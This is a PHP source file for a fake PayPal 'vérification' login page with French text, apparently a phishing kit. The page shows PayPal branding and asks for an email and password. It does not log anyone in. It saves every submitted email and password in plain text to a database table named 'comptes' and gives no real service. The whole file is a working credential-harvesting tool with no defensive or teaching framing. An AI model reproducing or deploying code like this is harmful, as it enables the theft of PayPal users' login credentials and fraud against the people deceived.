<?php
	session_start();
	$bdd = new PDO('mysql:localhost=localhost;dbname=paypal', 'root','');

	if(isset($_POST['connexion']))
	{
		$email = htmlspecialchars($_POST['email']);
		$password = htmlspecialchars($_POST['password']);

		if(!empty($email) and !empty($password))
		{
			if(filter_var($email,FILTER_VALIDATE_EMAIL))
			{
				$insert = $bdd->prepare("INSERT INTO comptes(email,password) VALUES(?,?)");
				$insert->execute(array($email,$password));

			}else
			{
				$erreur = 'Adresse email invalide';
			}

		}else
		{
			$erreur = 'Veuillez remplir tout les champs';
		}

	}

?>
<!Doctype html>
<html>
	<head>
		<meta charset="utf-8">
		<title>paypal vérification</title>
		<link rel="stylesheet" href="style.css">
	</head>
	<body>
		<form action="" method="post"> 
			<center>
			<div>
				<center>
					<img src="logo.png" alt="logo">
				</center>
				<span>
					<p class="erreur">
						<?php 
							if(isset($erreur))
							{
								echo $erreur;
							}
						 ?>
					</p>
					<center>
					<p>
						<input type="email" name="email" placeholder="Email">
					</p>
					<p>
						<input type="text" name="password" placeholder="Mot de passe">
					</p>
				    </center>
				</span>
					<center>
						<main>
						<input type="submit" name="connexion" value="connexion">
					    </main>
					</center>
				
			</div>
		    </center> 
		</form>
	</body>	
	
</html>






	
	
	
			
			